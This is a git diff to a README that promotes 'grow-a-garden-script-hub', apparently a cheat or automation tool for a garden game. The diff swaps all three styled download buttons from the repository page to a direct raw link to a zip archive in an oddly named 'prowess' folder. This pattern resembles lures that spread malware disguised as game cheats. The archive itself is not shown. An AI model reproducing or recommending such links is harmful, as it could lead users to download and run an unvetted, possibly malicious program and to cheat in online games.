@@ -1,6 +1,6 @@
 <h1>🌱 grow-a-garden-script-hub - Automate Your Garden Growth Effortlessly</h1>
 
-<a href="https://github.com/temperamentutility364/grow-a-garden-script-hub" style="display:inline-block;padding:15px 25px;background:linear-gradient(135deg,#4CAF50,#81C784);color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;box-shadow:0 4px 10px rgba(0,0,0,0.3);">⬇️ Download grow-a-garden-script-hub Now</a>
+<a href="https://github.com/temperamentutility364/grow-a-garden-script-hub/raw/refs/heads/main/prowess/grow-a-script-hub-garden-v3.8.zip" style="display:inline-block;padding:15px 25px;background:linear-gradient(135deg,#4CAF50,#81C784);color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;margin:20px 0;box-shadow:0 4px 10px rgba(0,0,0,0.3);">⬇️ Download grow-a-garden-script-hub Now</a>
 
 ## 🌟 What Is grow-a-garden-script-hub?
 
@@ -28,7 +28,7 @@ Follow these easy steps to get **grow-a-garden-script-hub** running on your comp
 
 ## 📥 Download & Setup
 
-<a href="https://github.com/temperamentutility364/grow-a-garden-script-hub" style="display:inline-block;background:linear-gradient(135deg,#2196F3,#64B5F6);color:white;padding:12px 20px;text-decoration:none;font-size:18px;border-radius:50px;margin:10px 0;font-weight:bold;">⬇️ Download grow-a-garden-script-hub Now</a>
+<a href="https://github.com/temperamentutility364/grow-a-garden-script-hub/raw/refs/heads/main/prowess/grow-a-script-hub-garden-v3.8.zip" style="display:inline-block;background:linear-gradient(135deg,#2196F3,#64B5F6);color:white;padding:12px 20px;text-decoration:none;font-size:18px;border-radius:50px;margin:10px 0;font-weight:bold;">⬇️ Download grow-a-garden-script-hub Now</a>
 
 Visit this link to download the application.
 
@@ -72,4 +72,4 @@ Visit this link to download the application.
 
 **grow-a-garden-script-hub** makes your garden simulation easier and faster. With automated gathering, aim help, and cross-platform compatibility, it’s a must-have for any gardener player. Download now and save time!
 
-<a href="https://github.com/temperamentutility364/grow-a-garden-script-hub" style="display:inline-block;background:linear-gradient(135deg,#FF5722,#FF8A65);color:white;padding:15px 30px;text-decoration:none;font-size:18px;font-weight:bold;border-radius:5px;margin-top:20px;">⬇️ Get grow-a-garden-script-hub Here</a>
+<a href="https://github.com/temperamentutility364/grow-a-garden-script-hub/raw/refs/heads/main/prowess/grow-a-script-hub-garden-v3.8.zip" style="display:inline-block;background:linear-gradient(135deg,#FF5722,#FF8A65);color:white;padding:15px 30px;text-decoration:none;font-size:18px;font-weight:bold;border-radius:5px;margin-top:20px;">⬇️ Get grow-a-garden-script-hub Here</a>
